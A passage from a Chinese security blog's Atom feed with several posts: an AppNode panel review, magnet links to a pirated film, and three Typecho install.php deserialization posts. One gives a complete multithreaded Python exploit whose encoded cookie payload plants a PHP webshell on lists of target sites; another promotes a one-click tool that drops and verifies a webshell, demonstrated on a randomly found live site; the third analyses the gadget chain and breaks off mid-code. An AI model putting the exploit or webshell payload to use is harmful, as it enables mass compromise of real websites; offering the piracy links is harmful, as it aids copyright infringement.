    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://www.appnode.com/" target="_blank" rel="external">AppNode</a> 是一款用于管理 Linux 服务器的软件。</p><p>它基于 Web 页面进行可视化操作，不但可以帮助不熟悉 Linux 命令的用户无障碍地管理他们的 Linux 服务器，也可以帮助 Linux 运维人员提升运维效率。直接上图把。<br><img src="https://www.appnode.com/images/home/desktop.png" alt=""><br><strong>可视化、简易高效</strong><br><img src="https://www.appnode.com/images/home/nodemgr.png" alt=""><br><strong>集中式设计，快速切换管理</strong><br><img src="https://www.appnode.com/images/home/sitemgr.png" alt=""><br><strong>强大的网站管理功能</strong><br><img src="https://www.appnode.com/images/home/apps.png" alt=""><br><strong>快速安装升级，丰富的软件市场</strong><br><img src="https://www.appnode.com/images/home/iptables.png" alt=""><br><strong>多重安全加固，资源实时监控</strong></p><h1 id="公告"><a href="#公告" class="headerlink" title="公告"></a>公告</h1><p>尊敬的 AppNode 用户，你好！<br>2017.11.1 是 AppNode 立项三周年的日子，为答谢大家这三年来对我们的支持，也感谢趣云公司大股东的强势入驻，自今日起，AppNode 永久免费啦 ！！！<br>是的，你没看错，现有功能全部免费，并且<strong>永久免费</strong>！！！<br>再次感谢所有用户的支持和信赖，我们将秉承初心，砥砺前行，继续开发，致力于为新老用户提供更优质、更稳定的管理面板产品而努力！<br><code>## 近两个月内已购买收费版本的用户，可在官网管理后台提交财务工单申请全额退费 ##</code></p><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ul><li>一个控制中心控制多台服务器</li><li>全新网站管理，超强的的建站功能</li><li>支持一键安装常用网站程序</li><li>最全面的 PHP 扩展模块，100 + 个</li><li>支持 MariaDB、MySQL、AliSQL</li><li>支持断点上传不限大小的文件管理</li><li>强大的可视化分区管理</li><li>支持备份到 FTP/SSH 和各种常见云存储</li><li>支持同步到云存储</li><li>支持 Node.js 运行环境</li><li>支持按端口或域名统计流量</li><li>强大的系统监控和报警功能</li><li>支持 Redis/Memcache 内存缓存</li><li>支持 Supervisord 进程托管</li><li>支持 frp 内网穿透</li><li>支持 rsync 同步</li><li>支持 Lsyncd 实时同步</li><li>支持 Git 服务器搭建</li><li>支持 Samba 服务器搭建<br>应用市场里目前共有 40 多个应用，还在不断继续增加。</li></ul><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>要求：</p><blockquote><p>操作系统：CentOS 6.x 32/64位<br>          CentOS 7.x 64位<br>          （暂不支持 Ubuntu、Debian）。<br>          内存要求：<br>          <strong>建议可用内存在 512MB 以上。</strong></p></blockquote><p><a href="https://www.appnode.com/install" target="_blank" rel="external">点这里查看安装命令</a></p><h1 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h1><iframe src="https://www.appnode.com/views/partials/common/install-demo.min.html" width="850px" height="750px" name="topFrame" scrolling="No" noresize="noresize" frameborder="0" id="topFrame"></iframe><h1 id="评测"><a href="#评测" class="headerlink" title="评测"></a>评测</h1><ul><li>与<a href="www.bt.cn">宝塔面板</a>相比起来，这款面板有更多的插件。</li><li>宝塔不限制建站数量，AppNode限制最多3个网站。</li><li>宝塔提供免费的SSL证书。</li><li>总得来说是一款不错的面板。推荐使用。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.appnode.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;AppN
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>战狼2超清和4k资源</title>
    <link href="http://www.chabug.org/2017/11/04/zhanlang2-4k/"/>
    <id>http://www.chabug.org/2017/11/04/zhanlang2-4k/</id>
    <published>2017-11-04T07:34:02.000Z</published>
    <updated>2017-11-04T07:36:55.141Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl63bioaavj30ps0eeq3d.jpg" alt="画质体验"></p><p>复制磁力链到百度网盘离线</p><p>1080P磁力：<code>magnet:?xt=urn:btih:106BC0651796AE46BACF6CF92C658FD754576F38</code></p><p>4K磁力：<code>magnet:?xt=urn:btih:7E364FE1EF493761AA7C2C4231F5D8DC34DF90FE</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006xriynly1fl63bioaavj30ps0eeq3d.jpg&quot; alt=&quot;画质体验&quot;&gt;&lt;/p&gt;
&lt;p&gt;复制磁力链到百度网盘离线&lt;/p&gt;
&lt;p&gt;1080P磁力：&lt;code&gt;magnet:?
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typecho 反序列化漏洞批量脚本</title>
    <link href="http://www.chabug.org/2017/11/03/typecho-batch/"/>
    <id>http://www.chabug.org/2017/11/03/typecho-batch/</id>
    <published>2017-11-03T13:37:37.000Z</published>
    <updated>2017-11-05T13:10:02.319Z</updated>
    
    <content type="html"><![CDATA[<p>来自<a href="http://exp10it.tk/2017/11/05/typecho-exploit/" target="_blank" rel="external">@X1r0z</a> 大佬的批量Python小脚本<br>工具没什么亮点, 支持批量而已。<br><a href="http://www.chabug.org/2017/11/03/typecho-install/">漏洞详情请看这里</a></p><p>生成地址 domain/p0.php 密码 p0<br>**Usage:</p><p>  typecho.py url</p><p>  typecho.py url.txt**<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">lock = threading.RLock()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">(u)</span>:</span></div><div class="line"></div><div class="line">    url = u + <span class="string">'/install.php?finish=1'</span></div><div class="line">    payload =  <span class="string">'YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=='</span></div><div class="line">    lock.acquire()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        r = requests.get(url,cookies=&#123;<span class="string">'__typecho_config'</span>:payload&#125;,headers=&#123;<span class="string">'Referer'</span>:url&#125;)</div><div class="line">        <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'[+] Shell: '</span> + u + <span class="string">'/p0.php '</span> + <span class="string">'Pass: p0'</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'[-] Failed'</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'[-] Connect Error'</span></div><div class="line">    lock.release()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">'[*] Exploit for Typecho'</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'[*] usage:'</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'    typecho.py url'</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'    typecho.py url.txt'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> len(sys.argv)&lt;<span class="number">2</span>:</div><div class="line">        usage()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>].split(<span class="string">'.'</span>)[<span class="number">-1</span>] == <span class="string">'txt'</span>:</div><div class="line">            <span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</div><div class="line">                list = f.read().split(<span class="string">'\n'</span>)</div><div class="line">            <span class="keyword">for</span> u <span class="keyword">in</span> list:</div><div class="line">                t = threading.Thread(target=attack,args=(u,))</div><div class="line">                t.start()</div><div class="line">            t.join()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            attack(sys.argv[<span class="number">1</span>])</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p><p><a href="https://github.com/X1r0z/typecho-exploit" target="_blank" rel="external">GitHub地址</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;来自&lt;a href=&quot;http://exp10it.tk/2017/11/05/typecho-exploit/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@X1r0z&lt;/a&gt; 大佬的批量Python小脚本&lt;br&gt;工具没什么亮点, 支持批量而已。&lt;br
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typecho利用工具</title>
    <link href="http://www.chabug.org/2017/11/03/typecho-tools/"/>
    <id>http://www.chabug.org/2017/11/03/typecho-tools/</id>
    <published>2017-11-03T11:37:37.000Z</published>
    <updated>2017-11-04T09:00:26.594Z</updated>
    
    <content type="html"><![CDATA[<p>今天刚写了typecho的漏洞分析文章，现在再发一个利用工具。<br>只有一个按钮，你可以什么都不需要懂，只需要点两下就完成了hack。</p><h1 id="运行工具"><a href="#运行工具" class="headerlink" title="运行工具"></a>运行工具</h1><p>解开压缩包后，直接执行typecho.exe （lib目录下包含了php相关的库）。</p><p>将要进行测试的typecho网站的url复制到最上面的文本框中。</p><p>下面大的白框是信息回显窗口。</p><p>提供一个关键字<code>power by typecho</code> 再来一个<code>© 2017 由 Typecho 强力驱动.Theme by</code><br>我通过谷歌随机找了一个Typecho网站进行测试。</p><h1 id="检测漏洞"><a href="#检测漏洞" class="headerlink" title="检测漏洞"></a>检测漏洞</h1><p>这个漏洞来源于install.php文件，这个文件不会自动删除，但可以被手动删除。</p><p>要成功利用该漏洞，网站必须没有删除install.php文件，同时也没有升级到最新的beta修复版本。</p><p>选好目标网站后，所以第一步就是检测是否存在漏洞。<br><img src="http://ww1.sinaimg.cn/large/006xriyngy1fl65q04cebj31hc0sm79c.jpg" alt=""><br>选中【检测漏洞】单选钮，再点击【执行】按钮。</p><p>如上图，如果成功回显了phpinfo的信息，说明网站存在漏洞，并且可以成功利用。</p><h1 id="释放shell"><a href="#释放shell" class="headerlink" title="释放shell"></a>释放shell</h1><p>第二步选中【释放shell】单选钮，再点击【执行】按钮。</p><p><img src="http://ww1.sinaimg.cn/large/006xriyngy1fl65q4uhqyj31hc0smaat.jpg" alt=""><br>如上图：回显“shell释放成功：expsky.php”，说明webshell文件成功生成。</p><p>（个别网站如果没有写入权限，这步可能会失败）</p><h1 id="验证shell"><a href="#验证shell" class="headerlink" title="验证shell"></a>验证shell</h1><p>对刚刚释放的webshell是否能正常工作进行验证。<br><img src="http://ww1.sinaimg.cn/large/006xriyngy1fl65q4wqerj31hc0smtde.jpg" alt=""><br>第三步选中【验证shell】单选钮，再点击【执行】按钮。</p><p>如上图，如果phpinfo再次成功回显，说明刚刚生产的webshell已经可以正常工作。</p><h1 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h1><blockquote><p>webshell地址：网站域名/expsky.php<br>webshell密码：expsky</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/006xriyngy1fl65q024bgj319a0kadhi.jpg" alt=""><br>上图可以看到我们释放webshell文件expsky.php。</p><p>演示完毕，在菜刀里把expsky.php删除了，完成自宫，没干坏事。</p><h1 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h1><p>可以先暂时删除掉根目录下掉 install.php 文件，或者也可以直接升级到最新的 Beta 版。</p><p>注意在升级的时候也要覆盖 install.php 文件。</p><h1 id="工具分享"><a href="#工具分享" class="headerlink" title="工具分享"></a>工具分享</h1><p>通过本工具，不需要懂技术，简单的点几下，半分钟内就可以完成网站的hack。</p><p>由于工具进一步完善后可能存在潜在危害，所以不提供源码。</p><p>工具下载: <a href="https://pan.baidu.com/s/1geYkDwf" target="_blank" rel="external">百度云</a> 密码: dhvi，保证无任何后门（其他任何渠道下载的与本人无关）。</p><p>最后再次声明，我开发这个工具仅为了技术研究，严禁非法使用，否则后果自负。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天刚写了typecho的漏洞分析文章，现在再发一个利用工具。&lt;br&gt;只有一个按钮，你可以什么都不需要懂，只需要点两下就完成了hack。&lt;/p&gt;
&lt;h1 id=&quot;运行工具&quot;&gt;&lt;a href=&quot;#运行工具&quot; class=&quot;headerlink&quot; title=&quot;运行工具&quot;&gt;&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typecho install.php 后门代码分析</title>
    <link href="http://www.chabug.org/2017/11/03/typecho-install/"/>
    <id>http://www.chabug.org/2017/11/03/typecho-install/</id>
    <published>2017-11-03T01:42:23.000Z</published>
    <updated>2017-11-04T07:23:54.235Z</updated>
    
    <content type="html"><![CDATA[<p>前几天的typecho爆的漏洞接二连三，我原本是想用typecho做博客的.</p><p>然后吓得我赶紧换了git+hexo。今天分析下这个install.php中的后门。</p><h1 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h1><ol><li>base64解码后反序列化cookie中传入的__typecho_config参数，</li><li>然后让__typecho_config作为构造参数例化一个Typecho_Db类，</li><li>接着通过POP链进行代码执行。</li></ol><p>涉及到的文件还有类名</p><p>install.php（unserialize） – &gt;  Db.php（class Typecho_Db）  – &gt;  Feed.php （class Typecho_Feed） – &gt;  Request.php （class Typecho_Request）</p><h2 id="install-php"><a href="#install-php" class="headerlink" title="install.php"></a>install.php</h2><ol><li>设置了正确的referer（网站url即可）</li><li>加上一个任意的finish参数</li><li>设置cookie中__typecho_config字段的值</li></ol><p>cookie中的__typecho_config得到序列化后的$config数组字符串,<br>反序列化后，再使用$config[‘adapter’]作为构造参数传入Typecho_Db的实例化过程。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>])) : <span class="meta">?&gt;</span></div><div class="line">               <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!@file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>)) : <span class="meta">?&gt;</span></div><div class="line">               &lt;h1 class="typecho-install-title"&gt;&lt;?php _e('安装失败!'); ?&gt;&lt;/h1&gt;</div><div class="line">               &lt;div class="typecho-install-body"&gt;</div><div class="line">                   &lt;form method=<span class="string">"post"</span> action=<span class="string">"?config"</span> name=<span class="string">"config"</span>&gt;</div><div class="line">                   &lt;p class="message error"&gt;&lt;?php _e('您没有上传 config.inc.php 文件，请您重新安装！'); ?&gt; &lt;button class="btn primary" type="submit"&gt;&lt;?php _e('重新安装 »'); ?&gt;&lt;/button&gt;&lt;/p&gt;</div><div class="line">                   &lt;/form&gt;</div><div class="line">               &lt;/div&gt;</div><div class="line">               <span class="meta">&lt;?php</span> <span class="keyword">elseif</span> (!Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)): <span class="meta">?&gt;</span></div><div class="line">               &lt;h1 class="typecho-install-title"&gt;&lt;?php _e('没有安装!'); ?&gt;&lt;/h1&gt;</div><div class="line">               &lt;div class="typecho-install-body"&gt;</div><div class="line">                   &lt;form method=<span class="string">"post"</span> action=<span class="string">"?config"</span> name=<span class="string">"config"</span>&gt;</div><div class="line">                   &lt;p class="message error"&gt;&lt;?php _e('您没有执行安装步骤，请您重新安装！'); ?&gt; &lt;button class="btn primary" type="submit"&gt;&lt;?php _e('重新安装 »'); ?&gt;&lt;/button&gt;&lt;/p&gt;</div><div class="line">                   &lt;/form&gt;</div><div class="line">               &lt;/div&gt;</div><div class="line">               <span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></div><div class="line">                   <span class="meta">&lt;?php</span></div><div class="line">                   $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</div><div class="line">                   Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</div><div class="line">                   $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</div><div class="line">                   $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</div><div class="line">                   Typecho_Db::set($db);</div><div class="line">                   <span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h2 id="Db-php"><a href="#Db-php" class="headerlink" title="Db.php"></a>Db.php</h2><p>$config[‘adapter’]在构造函数里面对应形参$adapterName,<br>$adapterName是Typecho_Feed类的实例，使用.字符连接就调用__toString魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="comment">/** 获取适配器名称 */</span></div><div class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</div><div class="line"></div><div class="line">        <span class="comment">/** 数据库适配器 */</span></div><div class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</div><div class="line"></div><div class="line">        <span class="comment">/** 初始化内部变量 */</span></div><div class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</div><div class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</div><div class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</div><div class="line"></div><div class="line">        <span class="comment">//实例化适配器对象</span></div><div class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</div><div class="line">    &#125;</div></pre></td></tr></table></figure><h2 id="Feed-php"><a href="#Feed-php" class="headerlink" title="Feed.php"></a>Feed.php</h2><p><code>$this-&gt;_type</code>用来控制if语句的流程，<br>给<code>$this-&gt;_type</code> 赋值 ATOM 1.0时，<br>即可进入包含$item[‘author’]-&gt;screenName的分支，<br>$item[‘author’]这个变量是一个Typecho_Request的实例,<br>我们可以设置这个Typecho_Request实例的属性screenName是一个私有属性，<br>当访问$item[‘author’]-&gt;screenName就会调用__get方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $result = <span class="string">'&lt;?xml version="1.0" encoding="'</span> . <span class="keyword">$this</span>-&gt;_charset . <span class="string">'"?&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (<span class="keyword">self</span>::RSS1 == <span class="keyword">$this</span>-&gt;_type) &#123;</div><div class="line">            $result .= <span class="string">'&lt;rdf:RDF</span></div><div class="line"><span class="string">xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"</span></div><div class="line"><span class="string">xmlns="http://purl.org/rss/1.0/"</span></div><div class="line"><span class="string">xmlns:dc="http://purl.org/dc/elements/1.1/"&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            $content = <span class="string">''</span>;</div><div class="line">            $links = <span class="keyword">array</span>();</div><div class="line">            $lastUpdate = <span class="number">0</span>;</div><div class="line"></div><div class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</div><div class="line">                $content .= <span class="string">'&lt;item rdf:about="'</span> . $item[<span class="string">'link'</span>] . <span class="string">'"&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class="string">'title'</span>]) . <span class="string">'&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;link&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/link&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;dc:date&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/dc:date&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;description&gt;'</span> . strip_tags($item[<span class="string">'content'</span>]) . <span class="string">'&lt;/description&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'suffix'</span>])) &#123;</div><div class="line">                    $content .= $item[<span class="string">'suffix'</span>];</div><div class="line">                &#125;</div><div class="line">                $content .= <span class="string">'&lt;/item&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">                $links[] = $item[<span class="string">'link'</span>];</div><div class="line"></div><div class="line">                <span class="keyword">if</span> ($item[<span class="string">'date'</span>] &gt; $lastUpdate) &#123;</div><div class="line">                    $lastUpdate = $item[<span class="string">'date'</span>];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            $result .= <span class="string">'&lt;channel rdf:about="'</span> . <span class="keyword">$this</span>-&gt;_feedUrl . <span class="string">'"&gt;</span></div><div class="line"><span class="string">&lt;title&gt;'</span> . htmlspecialchars(<span class="keyword">$this</span>-&gt;_title) . <span class="string">'&lt;/title&gt;</span></div><div class="line"><span class="string">&lt;link&gt;'</span> . <span class="keyword">$this</span>-&gt;_baseUrl . <span class="string">'&lt;/link&gt;</span></div><div class="line"><span class="string">&lt;description&gt;'</span> . htmlspecialchars(<span class="keyword">$this</span>-&gt;_subTitle) . <span class="string">'&lt;/description&gt;</span></div><div class="line"><span class="string">&lt;items&gt;</span></div><div class="line"><span class="string">&lt;rdf:Seq&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            <span class="keyword">foreach</span> ($links <span class="keyword">as</span> $link) &#123;</div><div class="line">                $result .= <span class="string">'&lt;rdf:li resource="'</span> . $link . <span class="string">'"/&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            $result .= <span class="string">'&lt;/rdf:Seq&gt;</span></div><div class="line"><span class="string">&lt;/items&gt;</span></div><div class="line"><span class="string">&lt;/channel&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            $result .= $content . <span class="string">'&lt;/rdf:RDF&gt;'</span>;</div><div class="line"></div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">self</span>::RSS2 == <span class="keyword">$this</span>-&gt;_type) &#123;</div><div class="line">            $result .= <span class="string">'&lt;rss version="2.0"</span></div><div class="line"><span class="string">xmlns:content="http://purl.org/rss/1.0/modules/content/"</span></div><div class="line"><span class="string">xmlns:dc="http://purl.org/dc/elements/1.1/"</span></div><div class="line"><span class="string">xmlns:slash="http://purl.org/rss/1.0/modules/slash/"</span></div><div class="line"><span class="string">xmlns:atom="http://www.w3.org/2005/Atom"</span></div><div class="line"><span class="string">xmlns:wfw="http://wellformedweb.org/CommentAPI/"&gt;</span></div><div class="line"><span class="string">&lt;channel&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            $content = <span class="string">''</span>;</div><div class="line">            $lastUpdate = <span class="number">0</span>;</div><div class="line"></div><div class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</div><div class="line">                $content .= <span class="string">'&lt;item&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class="string">'title'</span>]) . <span 